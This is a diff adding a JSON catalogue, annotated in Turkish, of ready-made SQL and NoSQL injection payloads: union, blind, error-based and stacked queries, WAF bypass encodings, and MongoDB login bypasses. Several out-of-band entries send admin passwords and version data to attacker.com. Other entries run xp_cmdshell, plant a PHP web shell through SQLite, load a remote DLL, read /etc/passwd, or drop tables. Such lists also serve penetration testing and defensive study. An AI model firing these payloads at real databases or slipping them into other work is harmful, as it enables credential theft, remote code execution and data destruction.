@@ -1,0 +1,674 @@
+{
+  "sql_basic_paylaods" : {
+    "payload" : [
+      "<SQL>'",
+      "<SQL>\"",
+      "<SQL>--",
+      "<SQL>#",
+      "<SQL>' or 1=1#"
+    ]
+  },
+  "error_based_sql": {
+    "desc": "Hata mesajları üzerinden veri çıkarma yöntemi",
+    "syntax": "SELECT * FROM table WHERE column = 'value' AND extractvalue(rand(),concat(0x3a,(SELECT query)));",
+    "example": "SELECT * FROM users WHERE id = 1' AND extractvalue(rand(),concat(0x3a,(SELECT @@version)));",
+    "category": "SQL Injection",
+    "type": "Error Based",
+    "risk": "High",
+    "purpose": "Veritabanı versiyonu ve sistem bilgilerini çıkarma"
+  },
+  "union_based_sql": {
+    "desc": "UNION komutu ile farklı tablolardan veri çıkarma",
+    "syntax": "SELECT columns FROM table1 UNION SELECT columns FROM table2;",
+    "example": "SELECT username, password FROM users WHERE id = 1 UNION SELECT credit_card, pin FROM customers;",
+    "category": "SQL Injection",
+    "type": "Union Based",
+    "risk": "Critical",
+    "purpose": "Birden fazla tablodan veri çıkarma"
+  },
+  "out_of_band_sql": {
+    "desc": "DNS veya HTTP gibi farklı kanallardan veri sızdırma yöntemi",
+    "syntax": "SELECT load_file(concat('\\\\\\\\', (SELECT query), '.attacker.com\\\\abc'));",
+    "example": "SELECT load_file(concat('\\\\\\\\', (SELECT @@version), '.attacker.com\\\\abc'));",
+    "category": "SQL Injection",
+    "type": "Out of Band",
+    "risk": "High",
+    "purpose": "Alternatif kanallardan veri exfiltration"
+  },
+  "boolean_based_sql": {
+    "desc": "Sorgu sonucunun doğru/yanlış olmasına göre veri çıkarma",
+    "syntax": "SELECT * FROM table WHERE condition AND substring(column,position,length) = 'character';",
+    "example": "SELECT * FROM users WHERE username = 'admin' AND substring(password,1,1) = 'a';",
+    "category": "SQL Injection",
+    "type": "Boolean Based",
+    "risk": "Medium",
+    "purpose": "Blind SQL injection ile veri tahmin etme"
+  },
+  "time_based_sql": {
+    "desc": "Zaman gecikmesi ile blind SQL injection gerçekleştirme",
+    "syntax": "SELECT * FROM table WHERE condition AND IF(condition, sleep(seconds), false);",
+    "examples": [
+      "SELECT * FROM users WHERE username = 'admin' AND IF(1=1, sleep(10), false);",
+      "SELECT * FROM users WHERE username = 'admin' AND IF(substring(password,1,1) = 'a', sleep(10), false);"
+    ],
+    "category": "SQL Injection",
+    "type": "Time Based",
+    "risk": "Medium",
+    "purpose": "Zaman tabanlı blind SQL injection"
+  },
+  "union_enumeration": {
+    "desc": "UNION ile sistemli veri toplama teknikleri",
+    "examples": [
+      "FORD' UNION SELECT 1,2,3,4 #",
+      "FORD' UNION SELECT USER(),DATABASE(),VERSION(),4 #",
+      "FORD' UNION SELECT username, password, 3, 4 FROM users #"
+    ],
+    "category": "SQL Injection",
+    "type": "Union Enumeration",
+    "risk": "Critical",
+    "purpose": "Sistemli veri toplama"
+  },
+  "database_enumeration": {
+    "desc": "Tüm veritabanlarını listeleme",
+    "syntax": "' UNION SELECT 1, schema_name, 3 FROM information_schema.schemata -- -",
+    "category": "SQL Injection",
+    "type": "Database Enumeration",
+    "risk": "High",
+    "purpose": "Veritabanı keşfi"
+  },
+  "table_enumeration": {
+    "desc": "Belirli veritabanındaki tabloları keşfetme",
+    "syntax": "' UNION SELECT 1, table_name, column_name, 4 FROM information_schema.columns WHERE table_schema = 'database_name' -- -",
+    "example": "' UNION SELECT 1, table_name, column_name, 4 FROM information_schema.columns WHERE table_schema = 'vega_dictionary' -- -",
+    "category": "SQL Injection",
+    "type": "Table Enumeration",
+    "risk": "High",
+    "purpose": "Tablo ve sütun keşfi"
+  },
+  "full_schema_dump": {
+    "desc": "Tüm tablo ve sütunları tek sorguda çekme",
+    "syntax": "' UNION SELECT 1, CONCAT(table_schema,'.',table_name), CONCAT(column_name,' (',data_type,')'), 4 FROM information_schema.columns WHERE table_schema NOT IN ('mysql','information_schema') -- -",
+    "category": "SQL Injection",
+    "type": "Schema Dump",
+    "risk": "Critical",
+    "purpose": "Tam veritabanı şeması çıkarma"
+  },
+  "specific_data_extraction": {
+    "desc": "Belirli kullanıcı verilerini çıkarma",
+    "examples": [
+      "' UNION SELECT 1, full_name, password FROM vega_dictionary.Users#",
+      "' UNION SELECT 1, password, 3 FROM vega_dictionary.Users WHERE username='antares'#"
+    ],
+    "category": "SQL Injection",
+    "type": "Data Extraction",
+    "risk": "Critical",
+    "purpose": "Spesifik veri çıkarma",
+    "note": "Gerçek saldırı senaryosunda kullanılan örnek"
+  },
+  "advanced_union_based_payloads": {
+    "desc": "Gelişmiş UNION tabanlı SQL injection payload'ları",
+    "examples": [
+      "' UNION SELECT @@version,@@servername,@@serviceaccount,4-- -",
+      "' UNION SELECT table_schema, table_name, column_name, 4 FROM information_schema.columns WHERE table_schema != 'information_schema'-- -",
+      "' UNION SELECT BANNER, null, null, null FROM v$version-- -",
+      "' UNION SELECT GROUP_CONCAT(table_name), null, null, null FROM information_schema.tables WHERE table_schema = database()-- -",
+      "' UNION SELECT LOAD_FILE('/etc/passwd'), null, null, null-- -",
+      "' UNION SELECT null, (SELECT user FROM mysql.user WHERE host = 'localhost'), null, null-- -"
+    ],
+    "category": "SQL Injection",
+    "type": "Advanced Union Based",
+    "risk": "Critical",
+    "purpose": "Gelişmiş veri çıkarma",
+    "reference": "HackTricks"
+  },
+  "time_based_advanced_payloads": {
+    "desc": "Gelişmiş zaman tabanlı SQL injection payload'ları",
+    "examples": [
+      "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -",
+      "' AND (SELECT * FROM (SELECT(CASE WHEN (1=1) THEN SLEEP(5) ELSE SLEEP(0) END))a)-- -",
+      "' AND (SELECT CASE WHEN (SELECT ORD(MID(password,1,1)) FROM users LIMIT 0,1)=65 THEN SLEEP(5) ELSE SLEEP(0) END)-- -",
+      "' AND (SELECT * FROM (SELECT(CASE WHEN (1=1) THEN SLEEP(5) ELSE SLEEP(0) END))a) AND '1'='1",
+      "'; WAITFOR DELAY '00:00:05'--",
+      "'; IF (1=1) WAITFOR DELAY '00:00:05'--"
+    ],
+    "category": "SQL Injection",
+    "type": "Advanced Time Based",
+    "risk": "Medium",
+    "purpose": "Gelişmiş blind SQL injection",
+    "reference": "PayloadsAllTheThings"
+  },
+  "boolean_based_advanced_payloads": {
+    "desc": "Gelişmiş boolean tabanlı SQL injection payload'ları",
+    "examples": [
+      "' AND ASCII(SUBSTRING((SELECT database()),1,1)) = 116 -- -",
+      "' AND SUBSTRING((SELECT TABLE_NAME FROM information_schema.TABLES LIMIT 1 OFFSET 0),1,1) = 'A' -- -",
+      "' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username = 'admin') = 'a' -- -",
+      "' AND ORD(MID((SELECT password FROM users WHERE username='admin'),1,1))=65 -- -",
+      "' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 1*(SELECT 1 FROM nonexistent_table) END) -- -",
+      "' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 1/(SELECT 0) END) -- -"
+    ],
+    "category": "SQL Injection",
+    "type": "Advanced Boolean Based",
+    "risk": "Medium",
+    "purpose": "Detaylı veri tahmini",
+    "reference": "HackTricks"
+  },
+  "out_of_band_advanced_payloads": {
+    "desc": "Gelişmiş out-of-band SQL injection payload'ları",
+    "examples": [
+      "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) IN (SELECT * FROM (SELECT(SLEEP(5)))b)-- -",
+      "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version), 0x7e))-- -",
+      "' AND UPDATEXML(1, CONCAT(0x7e, (SELECT @@version), 0x7e), 1)-- -",
+      "'; DECLARE @q varchar(200); SET @q='\\'+(SELECT TOP 1 NAME FROM master..syslogins)+'.'+ @@servername+'.attacker.com\\test'; EXEC master.dbo.xp_dirtree @q;--",
+      "'; DECLARE @q varchar(200); SET @q='\\'+(SELECT password FROM users WHERE username='admin')+'.attacker.com\\test'; EXEC master.dbo.xp_dirtree @q;--",
+      "' AND LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users WHERE username='admin'),'.attacker.com\\a.txt'))-- -"
+    ],
+    "category": "SQL Injection",
+    "type": "Advanced Out of Band",
+    "risk": "High",
+    "purpose": "Alternatif kanallarla veri çıkarma",
+    "reference": "HackTricks"
+  },
+  "mysql_specific_payloads": {
+    "desc": "MySQL özel payload'lar",
+    "examples": [
+      "' UNION SELECT /*!50000GROUP_CONCAT*/(table_name),null,null,null FROM information_schema.tables WHERE table_schema=database()-- -",
+      "' AND 1=2 UNION SELECT /*!50000GROUP_CONCAT*/(0x3c2f613e,0x3c6120687265663d2f2f,table_name,0x3e,table_name,0x3c2f613e),null,null,null FROM information_schema.tables WHERE table_schema=database()-- -",
+      "' PROCEDURE ANALYSE(1,1) --",
+      "1' AND ROW(1,2) > (SELECT COUNT(*),CONCAT(0x3a,BANNER,0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a-- -",
+      "1' AND ROW(1,2) > (SELECT COUNT(*),CONCAT(0x3a,0x3a,version(),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a-- -"
+    ],
+    "category": "SQL Injection",
+    "type": "MySQL Specific",
+    "risk": "Critical",
+    "purpose": "MySQL özel istismar",
+    "reference": "PayloadsAllTheThings"
+  },
+  "mssql_specific_payloads": {
+    "desc": "MSSQL özel payload'lar",
+    "examples": [
+      "'; WAITFOR DELAY '00:00:05'--",
+      "'; EXEC xp_cmdshell 'whoami'--",
+      "'; SELECT * FROM master..syslogins--",
+      "'; SELECT * FROM INFORMATION_SCHEMA.TABLES--",
+      "'; EXEC sp_who2--",
+      "'; SELECT @@VERSION--",
+      "'; SELECT DB_NAME()--",
+      "'; SELECT USER_NAME()--",
+      "'; SELECT SYSTEM_USER--",
+      "'; SELECT SUSER_SNAME()--"
+    ],
+    "category": "SQL Injection",
+    "type": "MSSQL Specific",
+    "risk": "Critical",
+    "purpose": "MSSQL özel istismar",
+    "reference": "HackTricks"
+  },
+  "postgresql_specific_payloads": {
+    "desc": "PostgreSQL özel payload'lar",
+    "examples": [
+      "' AND version() = version()-- -",
+      "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),0x3a,table_name,0x3a,column_name) FROM information_schema.columns GROUP BY 2)a)-- -",
+      "'; SELECT version();--",
+      "'; SELECT current_database();--",
+      "'; SELECT current_user;--",
+      "'; SELECT session_user;--",
+      "'; SELECT current_setting('log_connections');--",
+      "'; SELECT current_setting('log_statement');--",
+      "'; SELECT current_setting('port');--",
+      "'; SELECT current_setting('password_encryption');--"
+    ],
+    "category": "SQL Injection",
+    "type": "PostgreSQL Specific",
+    "risk": "Critical",
+    "purpose": "PostgreSQL özel istismar",
+    "reference": "PayloadsAllTheThings"
+  },
+  "oracle_specific_payloads": {
+    "desc": "Oracle özel payload'lar",
+    "examples": [
+      "' AND 1=UTL_INADDR.GET_HOST_NAME('attacker.com')-- -",
+      "' AND 1=UTL_HTTP.REQUEST('http://attacker.com')-- -",
+      "' UNION SELECT table_name FROM user_tables-- -",
+      "' UNION SELECT column_name FROM user_tab_columns WHERE table_name = 'USERS'-- -",
+      "' AND 1=(SELECT UTL_INADDR.GET_HOST_NAME((SELECT password FROM users WHERE username='admin')) FROM dual)-- -",
+      "'; SELECT BANNER FROM v$version;--",
+      "'; SELECT USER FROM dual;--",
+      "'; SELECT table_name FROM user_tables;--",
+      "'; SELECT column_name FROM user_tab_columns WHERE table_name = 'USERS';--"
+    ],
+    "category": "SQL Injection",
+    "type": "Oracle Specific",
+    "risk": "Critical",
+    "purpose": "Oracle özel istismar",
+    "reference": "HackTricks"
+  },
+  "waf_bypass_whitespace": {
+    "desc": "WAF bypass için whitespace manipulation",
+    "category": "SQL Injection",
+    "type": "WAF Bypass",
+    "risk": "Critical",
+    "examples": [
+      "' OR/**/'1'='1",
+      "' OR/**/1/**/=/**/1--",
+      "' OR/**/1=1/**/#",
+      "' OR\t1=1--",
+      "' OR%091=1--",
+      "' OR%0a1=1--",
+      "' OR%0b1=1--",
+      "' OR%0c1=1--",
+      "' OR%0d1=1--",
+      "' OR%a01=1--",
+      "'/**/OR/**/1/**/=/**/1/**/#",
+      "'%0aOR%0a1%0a=%0a1%0a--"
+    ],
+    "purpose": "WAF whitespace filtering bypass",
+    "reference": "PayloadsAllTheThings"
+  },
+  "waf_bypass_keywords": {
+    "desc": "WAF keyword filtering bypass",
+    "category": "SQL Injection",
+    "type": "WAF Bypass",
+    "risk": "Critical",
+    "techniques": {
+      "case_variation": [
+        "' UnIoN SeLeCt 1,2,3--",
+        "' uNiOn sElEcT 1,2,3--"
+      ],
+      "inline_comments": [
+        "' UN/**/ION SE/**/LECT 1,2,3--",
+        "' /*!50000UN*//*!50000ION*/ /*!50000SE*//*!50000LECT*/ 1,2,3--",
+        "' UNI%0aON%0aSELE%0aCT 1,2,3--"
+      ],
+      "url_encoding": [
+        "' %55NION %53ELECT 1,2,3--",
+        "' %75%6e%69%6f%6e %73%65%6c%65%63%74 1,2,3--"
+      ],
+      "double_encoding": [
+        "' %2555NION %2553ELECT 1,2,3--"
+      ],
+      "hex_encoding": [
+        "' 0x554e494f4e 0x53454c454354 1,2,3--"
+      ],
+      "buffer_overflow": [
+        "' AND 1=1 /*!50000AND*/ /*!50000AND*/ ... (repeat) ... /*!50000AND*/ 1=1--"
+      ]
+    },
+    "purpose": "WAF keyword detection bypass",
+    "reference": "HackTricks"
+  },
+  "waf_bypass_equivalent_functions": {
+    "desc": "Equivalent fonksiyonlarla bypass",
+    "category": "SQL Injection",
+    "type": "WAF Bypass",
+    "risk": "High",
+    "equivalents": {
+      "substring": {
+        "desc": "SUBSTRING alternatif kullanımları",
+        "alternatives": [
+          "SUBSTR()",
+          "MID()",
+          "LEFT()",
+          "RIGHT()"
+        ],
+        "examples": [
+          "SUBSTRING(password,1,1) = 'a'",
+          "SUBSTR(password,1,1) = 'a'",
+          "MID(password,1,1) = 'a'",
+          "LEFT(password,1) = 'a'"
+        ]
+      },
+      "ascii": {
+        "desc": "ASCII alternatif kullanımları",
+        "alternatives": [
+          "ORD()",
+          "HEX()",
+          "BIN()"
+        ],
+        "examples": [
+          "ASCII(SUBSTRING(password,1,1)) = 97",
+          "ORD(SUBSTRING(password,1,1)) = 97",
+          "HEX(SUBSTRING(password,1,1)) = '61'"
+        ]
+      },
+      "sleep": {
+        "desc": "SLEEP alternatif kullanımları",
+        "alternatives": [
+          "BENCHMARK()",
+          "WAIT FOR DELAY",
+          "pg_sleep()",
+          "dbms_lock.sleep()"
+        ],
+        "examples": [
+          "SLEEP(5)",
+          "BENCHMARK(10000000,MD5('A'))",
+          "WAIT FOR DELAY '00:00:05'",
+          "pg_sleep(5)",
+          "dbms_lock.sleep(5)"
+        ]
+      }
+    },
+    "purpose": "Fonksiyon filtering bypass",
+    "reference": "PayloadsAllTheThings"
+  },
+  "waf_bypass_scientific_notation": {
+    "desc": "Scientific notation ile bypass",
+    "category": "SQL Injection",
+    "type": "WAF Bypass",
+    "risk": "Medium",
+    "examples": [
+      "' OR 1e0=1--",
+      "' OR 1.0e0=1--",
+      "' OR 0x1=1--",
+      "' OR 1.e1>10--"
+    ],
+    "purpose": "Numeric filtering bypass",
+    "reference": "HackTricks"
+  },
+  "nosql_injection_mongodb": {
+    "desc": "MongoDB NoSQL Injection payload'ları",
+    "category": "NoSQL Injection",
+    "type": "MongoDB",
+    "risk": "Critical",
+    "authentication_bypass": {
+      "desc": "Authentication bypass payloads",
+      "json_payloads": [
+        "{\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}}",
+        "{\"username\": {\"$ne\": \"\"}, \"password\": {\"$ne\": \"\"}}",
+        "{\"username\": {\"$gt\": \"\"}, \"password\": {\"$gt\": \"\"}}",
+        "{\"username\": {\"$regex\": \".*\"}, \"password\": {\"$regex\": \".*\"}}",
+        "{\"username\": \"admin\", \"password\": {\"$ne\": 1}}"
+      ],
+      "url_payloads": [
+        "username[$ne]=admin&password[$ne]=pass",
+        "username[$gt]=&password[$gt]=",
+        "username[$regex]=.*&password[$regex]=.*",
+        "username=admin&password[$ne]=1"
+      ]
+    },
+    "data_extraction": {
+      "desc": "Regex ile veri extraction",
+      "examples": [
+        "{\"username\": {\"$regex\": \"^a\"}}",
+        "{\"username\": {\"$regex\": \"^ad\"}}",
+        "{\"username\": {\"$regex\": \"^adm\"}}",
+        "{\"password\": {\"$regex\": \"^p.*\"}}",
+        "{\"password\": {\"$regex\": \"^[a-z].*\"}}"
+      ],
+      "purpose": "Blind NoSQL injection ile veri çıkarma"
+    },
+    "javascript_injection": {
+      "desc": "JavaScript injection (where, $where kullanımı)",
+      "examples": [
+        "' || '1'=='1",
+        "' || this.password.match(/^a.*$/) || '",
+        "'; return true; var x='",
+        "'; return this.username == 'admin'; var x='"
+      ],
+      "purpose": "MongoDB JavaScript context injection"
+    },
+    "operators": {
+      "comparison": [
+        "$eq - Equal",
+        "$ne - Not equal",
+        "$gt - Greater than",
+        "$gte - Greater than or equal",
+        "$lt - Less than",
+        "$lte - Less than or equal",
+        "$in - In array",
+        "$nin - Not in array"
+      ],
+      "logical": [
+        "$and",
+        "$or",
+        "$not",
+        "$nor"
+      ],
+      "element": [
+        "$exists",
+        "$type"
+      ],
+      "evaluation": [
+        "$regex",
+        "$where",
+        "$expr"
+      ]
+    },
+    "purpose": "MongoDB NoSQL injection",
+    "reference": "HackTricks"
+  },
+  "nosql_injection_couchdb": {
+    "desc": "CouchDB NoSQL Injection",
+    "category": "NoSQL Injection",
+    "type": "CouchDB",
+    "risk": "High",
+    "examples": [
+      "username[$gt]=&password[$gt]=",
+      "{\"selector\": {\"username\": {\"$gt\": null}}}",
+      "{\"selector\": {\"password\": {\"$regex\": \".*\"}}}"
+    ],
+    "purpose": "CouchDB NoSQL injection"
+  },
+  "sqlite_specific": {
+    "desc": "SQLite specific payloads",
+    "category": "SQL Injection",
+    "type": "SQLite",
+    "risk": "Critical",
+    "enumeration": {
+      "database_info": [
+        "' UNION SELECT sqlite_version(),null,null--",
+        "' UNION SELECT sql,null,null FROM sqlite_master--",
+        "' UNION SELECT name,null,null FROM sqlite_master WHERE type='table'--",
+        "' UNION SELECT sql,null,null FROM sqlite_master WHERE type='table' AND name='users'--"
+      ]
+    },
+    "file_operations": {
+      "desc": "SQLite dosya işlemleri",
+      "examples": [
+        "' UNION SELECT load_extension('\\\\\\\\attacker.com\\\\evil.dll')--",
+        "ATTACH DATABASE '/etc/passwd' AS pwn;",
+        "' ; ATTACH DATABASE '/tmp/shell.php' AS shell; CREATE TABLE shell.pwn (code TEXT); INSERT INTO shell.pwn VALUES ('<?php system($_GET[\"cmd\"]); ?>');--"
+      ]
+    },
+    "time_based": [
+      "' AND (SELECT COUNT(*) FROM sqlite_master) = randomblob(1000000000)--",
+      "' AND LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))--"
+    ],
+    "purpose": "SQLite exploitation",
+    "reference": "PayloadsAllTheThings"
+  },
+  "sqli_polyglot": {
+    "desc": "Polyglot SQL injection payloads (multi-context)",
+    "category": "SQL Injection",
+    "type": "Polyglot",
+    "risk": "Critical",
+    "payloads": [
+      "SLEEP(1) /*' or SLEEP(1) or '\" or SLEEP(1) or \"*/",
+      "' OR 1=1#\" OR 1=1#",
+      "1' or '1'='1' UNION SELECT null,null,null-- -",
+      "admin' or '1'='1'#",
+      "admin' or '1'='1'/*",
+      "admin'--",
+      "admin' #",
+      "admin'/*",
+      "' or 1=1--",
+      "' or 1=1#",
+      "' or 1=1/*",
+      "') or '1'='1--",
+      "') or ('1'='1--"
+    ],
+    "purpose": "Multiple context'lerde çalışan universal payloads",
+    "reference": "PayloadsAllTheThings"
+  },
+  "sqli_second_order": {
+    "desc": "Second Order SQL Injection",
+    "category": "SQL Injection",
+    "type": "Second Order",
+    "risk": "Critical",
+    "concept": {
+      "desc": "Payload bir yerde saklanıp başka yerde çalıştırılır",
+      "example_scenario": [
+        "1. Kullanıcı kayıt: username = admin'--",
+        "2. Payload veritabanına kaydedilir",
+        "3. Admin panel'de username görüntülenir",
+        "4. SQL query: SELECT * FROM logs WHERE username='admin'--'",
+        "5. Injection tetiklenir"
+      ]
+    },
+    "test_payloads": [
+      "admin'--",
+      "admin'#",
+      "admin' or '1'='1",
+      "'; DROP TABLE users--"
+    ],
+    "purpose": "Stored input'tan SQL injection",
+    "reference": "PortSwigger"
+  },
+  "sqli_stacked_queries": {
+    "desc": "Stacked Queries ile multiple SQL execution",
+    "category": "SQL Injection",
+    "type": "Stacked Queries",
+    "risk": "Critical",
+    "supported_databases": {
+      "mssql": true,
+      "postgresql": true,
+      "mysql": false,
+      "oracle": false
+    },
+    "examples": [
+      "'; DROP TABLE users--",
+      "'; INSERT INTO users VALUES ('hacker','pass')--",
+      "'; UPDATE users SET password='hacked' WHERE username='admin'--",
+      "'; EXEC xp_cmdshell('whoami')--",
+      "'; CREATE TABLE pwned (data TEXT)--",
+      "1; WAITFOR DELAY '00:00:05'--",
+      "1; SELECT pg_sleep(5)--"
+    ],
+    "purpose": "Birden fazla SQL statement çalıştırma",
+    "reference": "HackTricks"
+  },
+  "sqli_routed_injection": {
+    "desc": "Routed SQL Injection (SQL Server Link Server)",
+    "category": "SQL Injection",
+    "type": "Routed Injection",
+    "risk": "Critical",
+    "concept": "Linked server üzerinden başka servera SQL injection",
+    "examples": [
+      "'; EXEC ('xp_cmdshell ''whoami''') AT [LinkedServer]--",
+      "'; SELECT * FROM OPENQUERY([LinkedServer], 'SELECT @@version')--"
+    ],
+    "purpose": "Linked SQL servers exploitation",
+    "reference": "HackTricks"
+  },
+  "sqli_insert_update": {
+    "desc": "INSERT ve UPDATE query'lerinde SQL injection",
+    "category": "SQL Injection",
+    "type": "INSERT/UPDATE Injection",
+    "risk": "Critical",
+    "insert_injection": {
+      "desc": "INSERT query injection",
+      "examples": [
+        "username: admin',(SELECT password FROM users WHERE username='admin'))#",
+        "email: test@test.com', (SELECT @@version))#"
+      ]
+    },
+    "update_injection": {
+      "desc": "UPDATE query injection",
+      "examples": [
+        "username: admin' WHERE 1=1#",
+        "password: ' OR '1'='1",
+        "email: test@test.com', admin_flag='1"
+      ]
+    },
+    "purpose": "Non-SELECT query'lerde injection",
+    "reference": "PortSwigger"
+  },
+  "sqli_waf_tamper_scripts": {
+    "desc": "SQLMap tamper script benzeri bypass teknikleri",
+    "category": "SQL Injection",
+    "type": "WAF Bypass Techniques",
+    "risk": "Critical",
+    "techniques": {
+      "space2comment": {
+        "desc": "Boşlukları comment'e çevir",
+        "example": "' UNION/**/SELECT/**/1,2,3--"
+      },
+      "space2plus": {
+        "desc": "Boşlukları + işaretine çevir",
+        "example": "'+UNION+SELECT+1,2,3--"
+      },
+      "space2morehash": {
+        "desc": "Boşlukları #'lı comment'e çevir",
+        "example": "'%23%0aUNION%23%0aSELECT%23%0a1,2,3--"
+      },
+      "randomcase": {
+        "desc": "Random case değişimi",
+        "example": "' UnIoN SeLeCt 1,2,3--"
+      },
+      "charencode": {
+        "desc": "Karakter encoding",
+        "example": "' %55NION %53ELECT 1,2,3--"
+      },
+      "between": {
+        "desc": "> ve < yerine BETWEEN kullan",
+        "example": "' AND id BETWEEN 1 AND 1--"
+      },
+      "greatest": {
+        "desc": "Comparison için GREATEST kullan",
+        "example": "' AND GREATEST(ASCII(SUBSTRING((SELECT password),1,1)),0)=65--"
+      },
+      "versionedkeywords": {
+        "desc": "MySQL versioned keywords",
+        "example": "/*!50000UNION*/ /*!50000SELECT*/ 1,2,3--"
+      }
+    },
+    "purpose": "Automated WAF bypass techniques",
+    "reference": "SQLMap Tamper Scripts"
+  },
+  "sqli_filter_bypass_tricks": {
+    "desc": "Gelişmiş filter bypass püf noktaları",
+    "category": "SQL Injection",
+    "type": "Filter Bypass",
+    "risk": "Critical",
+    "tricks": {
+      "quote_bypass": {
+        "desc": "Tek/çift tırnak kullanmadan bypass",
+        "examples": [
+          "' OR 1=1--",
+          "admin\\",
+          "\\' OR 1=1--",
+          "' OR user=CHAR(97,100,109,105,110)--"
+        ]
+      },
+      "comma_bypass": {
+        "desc": "Virgül kullanmadan bypass",
+        "examples": [
+          "' UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b--",
+          "' UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c--",
+          "SUBSTRING(password FROM 1 FOR 1)",
+          "MID(password FROM 1 FOR 1)"
+        ]
+      },
+      "equal_bypass": {
+        "desc": "= operatörü kullanmadan bypass",
+        "examples": [
+          "' OR 'a' LIKE 'a",
+          "' OR 'a' IN ('a')--",
+          "' OR 1 BETWEEN 1 AND 1--",
+          "' OR STRCMP('a','a')=0--"
+        ]
+      },
+      "or_and_bypass": {
+        "desc": "OR/AND kelimelerini bypass",
+        "examples": [
+          "' || 1=1--",
+          "' && 1=1--",
+          "' | 1--",
+          "' & 1--"
+        ]
+      }
+    },
+    "purpose": "Advanced character filtering bypass",
+    "reference": "PayloadsAllTheThings"
+  }
+}
